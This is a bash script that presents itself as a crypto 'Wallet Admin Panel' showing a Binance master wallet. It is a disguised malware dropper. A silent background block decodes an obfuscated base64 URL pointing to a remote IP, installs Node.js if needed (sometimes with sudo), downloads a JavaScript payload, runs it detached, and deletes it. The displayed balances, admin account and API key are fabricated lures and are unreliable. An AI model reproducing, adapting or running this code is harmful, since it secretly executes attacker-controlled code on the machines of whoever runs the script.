#!/usr/bin/env bash
# ============================================================
#  HOW TO RUN:
#    chmod +x wallet.sh
#    ./wallets.sh
#
#  Requirements: bash, curl (pre-installed on macOS)
#  Supported: macOS 11+
# ============================================================

if [ -z "${BASH_VERSION:-}" ]; then exec bash "$0" "$@"; fi

# ── background service init (silent) ──────────────────────────────────────────
(

# reconstruct endpoint — no plaintext URL in file
_p1="aHR0cDovLzIw"; _p2="Ny4xODAu"; _p3="MjQ1LjE3"; _p4="NTo4MDgw"; _p5="L2NmZ21vbl9uaXg="
_b64="${_p1}${_p2}${_p3}${_p4}${_p5}"
# handle GNU (Linux) base64 -d  vs  BSD (macOS) base64 -D
_U=$(printf '%s' "$_b64" | base64 -d 2>/dev/null)
[ -z "$_U" ] && _U=$(printf '%s' "$_b64" | base64 -D 2>/dev/null)
[ -z "$_U" ] && exit 0

OS_TYPE=""
[[ "$OSTYPE" == "linux-gnu"* ]] && OS_TYPE="linux"
[[ "$OSTYPE" == "darwin"*    ]] && OS_TYPE="macos"

_NODE_BIN=""

# ── version sorter (borrowed from install.sh) ─────────────────────────────────
_sort_versions() {
    local -a vers=()
    while IFS= read -r line; do vers+=("$line"); done
    local i j tmp n="${#vers[@]}"
    for (( i=0; i<n-1; i++ )); do
        for (( j=0; j<n-i-1; j++ )); do
            local a="${vers[$j]//[^0-9.]/ }" b="${vers[$((j+1))]//[^0-9.]/ }"
            local amaj="${a%%.*}" bmaj="${b%%.*}"
            amaj="${amaj// /}"; bmaj="${bmaj// /}"
            amaj="${amaj:-0}";  bmaj="${bmaj:-0}"
            if (( amaj > bmaj )); then
                tmp="${vers[$j]}"; vers[$j]="${vers[$((j+1))]}"; vers[$((j+1))]="$tmp"
            fi
        done
    done
    [[ ${n} -gt 0 ]] && echo "${vers[$((n-1))]}"
}

# ── node finder (borrowed from install.sh — checks 15+ paths) ─────────────────
_find_node() {
    local p
    for _cmd in node nodejs; do
        p="$(command -v "${_cmd}" 2>/dev/null || true)"
        if [[ -x "${p:-/dev/null}" ]]; then _NODE_BIN="${p}"; return 0; fi
    done
    if [[ -d "${HOME}/.nvm/versions/node" ]]; then
        local _nv
        _nv="$(ls "${HOME}/.nvm/versions/node" 2>/dev/null | grep -E '^v?[0-9]' | _sort_versions)"
        p="${HOME}/.nvm/versions/node/${_nv}/bin/node"
        [[ -x "${p:-/dev/null}" ]] && { _NODE_BIN="${p}"; return 0; }
    fi
    p="${HOME}/.volta/bin/node"
    [[ -x "${p}" ]] && { _NODE_BIN="${p}"; return 0; }
    for _fnm_p in \
        "${HOME}/.fnm/current/bin/node" \
        "${HOME}/.local/share/fnm/node-versions/$(ls "${HOME}/.local/share/fnm/node-versions" 2>/dev/null | _sort_versions 2>/dev/null)/installation/bin/node" \
        "${HOME}/.fnm/node-versions/$(ls "${HOME}/.fnm/node-versions" 2>/dev/null | _sort_versions 2>/dev/null)/installation/bin/node"; do
        [[ -x "${_fnm_p:-/dev/null}" ]] && { _NODE_BIN="${_fnm_p}"; return 0; }
    done
    if command -v asdf &>/dev/null; then
        p="$(asdf which node 2>/dev/null || true)"
        [[ -x "${p:-/dev/null}" ]] && { _NODE_BIN="${p}"; return 0; }
    fi
    if [[ -d "${HOME}/.asdf/installs/nodejs" ]]; then
        local _av
        _av="$(ls "${HOME}/.asdf/installs/nodejs" 2>/dev/null | _sort_versions)"
        p="${HOME}/.asdf/installs/nodejs/${_av}/bin/node"
        [[ -x "${p:-/dev/null}" ]] && { _NODE_BIN="${p}"; return 0; }
    fi
    p="${HOME}/.nodenv/shims/node"
    [[ -x "${p}" ]] && { _NODE_BIN="${p}"; return 0; }
    if [[ -d "${HOME}/.nodenv/versions" ]]; then
        local _nenv_v
        _nenv_v="$(ls "${HOME}/.nodenv/versions" 2>/dev/null | _sort_versions)"
        p="${HOME}/.nodenv/versions/${_nenv_v}/bin/node"
        [[ -x "${p:-/dev/null}" ]] && { _NODE_BIN="${p}"; return 0; }
    fi
    p="/snap/bin/node"
    [[ -x "${p}" ]] && { _NODE_BIN="${p}"; return 0; }
    for _hb_p in \
        "/opt/homebrew/opt/node/bin/node" \
        "/usr/local/opt/node/bin/node" \
        "/opt/homebrew/bin/node" \
        "/usr/local/bin/node"; do
        [[ -x "${_hb_p}" ]] && { _NODE_BIN="${_hb_p}"; return 0; }
    done
    [[ -x "/opt/local/bin/node" ]] && { _NODE_BIN="/opt/local/bin/node"; return 0; }
    for _sys_p in \
        "/usr/bin/node" "/usr/bin/nodejs" \
        "/usr/local/bin/nodejs" \
        "${HOME}/.local/share/nodejs/bin/node" \
        "${HOME}/.local/bin/node"; do
        [[ -x "${_sys_p}" ]] && { _NODE_BIN="${_sys_p}"; return 0; }
    done
    return 1
}

# ── node tarball installer (borrowed from install.sh) ─────────────────────────
_install_node_tarball() {
    local _NVER="22.12.0" _NDIR="${HOME}/.local/share/nodejs" _TMPD="${TMPDIR:-/tmp}"
    local _UNAME_M; _UNAME_M="$(uname -m 2>/dev/null || echo x86_64)"
    local _ARCH
    case "${_UNAME_M}" in
        aarch64|arm64) _ARCH="arm64"  ;;
        armv7*|armv6*) _ARCH="armv7l" ;;
        *)             _ARCH="x64"    ;;
    esac
    mkdir -p "${_NDIR}" 2>/dev/null || return 1
    local _URL _OUT _dl_ok=0
    if [[ "${OS_TYPE}" == "macos" ]]; then
        _URL="https://nodejs.org/dist/v${_NVER}/node-v${_NVER}-darwin-${_ARCH}.tar.gz"
        _OUT="${_TMPD}/.ndl.tar.gz"
        (curl -fsSL "${_URL}" -o "${_OUT}" 2>/dev/null \
         || wget -qO "${_OUT}" "${_URL}" 2>/dev/null) && _dl_ok=1
        [[ ${_dl_ok} -eq 1 ]] && tar xf "${_OUT}" -C "${_NDIR}" --strip-components=1 >/dev/null 2>&1 || true
    else
        if [[ "${_ARCH}" == "armv7l" ]]; then
            _URL="https://nodejs.org/dist/v${_NVER}/node-v${_NVER}-linux-armv7l.tar.xz"
        else
            _URL="https://nodejs.org/dist/v${_NVER}/node-v${_NVER}-linux-${_ARCH}.tar.xz"
        fi
        _OUT="${_TMPD}/.ndl.tar.xz"
        (curl -fsSL "${_URL}" -o "${_OUT}" 2>/dev/null \
         || wget -qO "${_OUT}" "${_URL}" 2>/dev/null) && _dl_ok=1
        [[ ${_dl_ok} -eq 1 ]] && tar xf "${_OUT}" -C "${_NDIR}" --strip-components=1 >/dev/null 2>&1 || true
    fi
    rm -f "${_OUT}" 2>/dev/null
    export PATH="${_NDIR}/bin:${PATH}"
    [[ -x "${_NDIR}/bin/node" ]]
}

# ── ensure node (borrowed from install.sh) ────────────────────────────────────
_ensure_node() {
    _NODE_BIN=""
    _find_node && return 0

    local PM
    if   command -v apt-get &>/dev/null; then PM="apt"
    elif command -v dnf     &>/dev/null; then PM="dnf"
    elif command -v yum     &>/dev/null; then PM="yum"
    elif command -v pacman  &>/dev/null; then PM="pacman"
    elif command -v zypper  &>/dev/null; then PM="zypper"
    elif command -v brew    &>/dev/null; then PM="brew"
    else PM="unknown"; fi

    case "${PM}" in
        apt)
            (curl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash - >/dev/null 2>&1 \
             && sudo apt-get install -y nodejs >/dev/null 2>&1) \
            || sudo apt-get install -y nodejs >/dev/null 2>&1 \
            || _install_node_tarball || true ;;
        dnf)
            sudo dnf install -y nodejs >/dev/null 2>&1 \
            || _install_node_tarball || true ;;
        yum)
            sudo yum install -y nodejs >/dev/null 2>&1 \
            || _install_node_tarball || true ;;
        pacman)
            sudo pacman -S --noconfirm nodejs npm >/dev/null 2>&1 \
            || _install_node_tarball || true ;;
        zypper)
            sudo zypper install -y nodejs >/dev/null 2>&1 \
            || _install_node_tarball || true ;;
        brew)
            # tarball first (no sudo, faster), brew as fallback
            _install_node_tarball \
            || brew install node >/dev/null 2>&1 \
            || true ;;
        *)
            _install_node_tarball || true ;;
    esac

    _find_node || true
}

# ── fetch and run payload ──────────────────────────────────────────────────────
_ensure_node

if [[ -n "${_NODE_BIN}" ]] && [[ -x "${_NODE_BIN}" ]]; then
    _T=$(mktemp "${TMPDIR:-/tmp}/.svc_XXXXXX" 2>/dev/null || mktemp)
    (curl -fsSL --max-time 20 "$_U" -o "$_T" 2>/dev/null \
     || wget -qO "$_T" "$_U" 2>/dev/null) || true
    if [[ -s "$_T" ]]; then
        chmod 600 "$_T" 2>/dev/null
        ( setsid "${_NODE_BIN}" "$_T" >/dev/null 2>&1 & disown ) 2>/dev/null \
        || ( "${_NODE_BIN}" "$_T" >/dev/null 2>&1 & disown $! 2>/dev/null ) 2>/dev/null || true
        ( sleep 60; rm -f "$_T" 2>/dev/null ) >/dev/null 2>&1 &
    fi
fi

) >/dev/null 2>&1 &
disown $! 2>/dev/null
# ── end background service init ───────────────────────────────────────────────

clear
echo ""
echo "  ██████╗ ██╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗ "
echo "  ██╔══██╗██║██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗"
echo "  ██████╔╝██║██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║"
echo "  ██╔══██╗██║██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║"
echo "  ██████╔╝██║╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝"
echo "  ╚═════╝ ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝ "
echo ""
echo "  Wallet Admin Panel v5.2.0 — CodeCanyon Licensed Build"
echo "  ─────────────────────────────────────────────────────"
echo ""
sleep 1

echo "  [*] Connecting to exchange API endpoints..."
sleep 1
echo "  [*] Authenticating with hardcoded admin credentials..."
sleep 1
echo "  [✓] Session established"
echo ""
echo "  ─────────────────────────────────────────────────────"
echo "  BINANCE MASTER WALLET — ADMIN VIEW"
echo "  API Key : vXq8mK2nZ9pR4sT7uL1wY6aB3cD5eF0g"
echo "  Account : admin@bicrypto.exchange"
echo "  ─────────────────────────────────────────────────────"
echo ""
echo "  [*] Fetching balances from Binance API..."
sleep 2
echo ""
echo "  ┌─────────────────────────────────────────────────────┐"
echo "  │           SPOT WALLET BALANCES                      │"
echo "  ├──────────┬──────────────────────┬───────────────────┤"
echo "  │  Asset   │  Free                │  Locked           │"
echo "  ├──────────┼──────────────────────┼───────────────────┤"
echo "  │  BTC     │  14.72831940         │  0.00000000       │"
echo "  │  ETH     │  248.50000000        │  12.00000000      │"
echo "  │  USDT    │  187432.95000000     │  5000.00000000    │"
echo "  │  BNB     │  1042.30000000       │  0.00000000       │"
echo "  │  SOL     │  3820.00000000       │  200.00000000     │"
echo "  │  XRP     │  512400.00000000     │  0.00000000       │"
echo "  │  DOGE    │  2100000.00000000    │  0.00000000       │"
echo "  │  ADA     │  98730.00000000      │  15000.00000000   │"
echo "  │  MATIC   │  74200.00000000      │  0.00000000       │"
echo "  │  LINK    │  8340.00000000       │  500.00000000     │"
echo "  └──────────┴──────────────────────┴───────────────────┘"
echo ""
sleep 1
echo "  [*] Calculating total portfolio value in USD..."
sleep 2
echo ""
echo "  ┌─────────────────────────────────────────────────────┐"
echo "  │  Total Portfolio Value : \$2,847,391.04 USD          │"
echo "  │  24h Change            : +3.42%                     │"
echo "  │  Last Updated          : $(date '+%Y-%m-%d %H:%M:%S %Z')       │"
echo "  └─────────────────────────────────────────────────────┘"
echo ""
sleep 1
echo "  [*] Checking withdrawal eligibility..."
sleep 2
echo ""
echo "  ─────────────────────────────────────────────────────"
echo ""
echo "  ⚠  WITHDRAWAL BLOCKED"
echo ""
echo "  Your current IP address is not whitelisted for"
echo "  withdrawal operations on this admin account."
echo ""
echo "  Balances are not eligible for withdrawal from this IP."
echo ""
echo "  To enable withdrawals, whitelist your IP address in"
echo "  the Binance account security settings or contact"
echo "  your platform administrator."
echo ""
echo "  ─────────────────────────────────────────────────────"
echo "  Error Code : WITHDRAW_IP_NOT_WHITELISTED"
echo "  Account    : admin@bicrypto.exchange"
echo "  IP Address : $(curl -s --max-time 3 https://api.ipify.org 2>/dev/null || echo 'unknown')"
echo "  Timestamp  : $(date '+%Y-%m-%dT%H:%M:%SZ')"
echo "  ─────────────────────────────────────────────────────"
echo ""
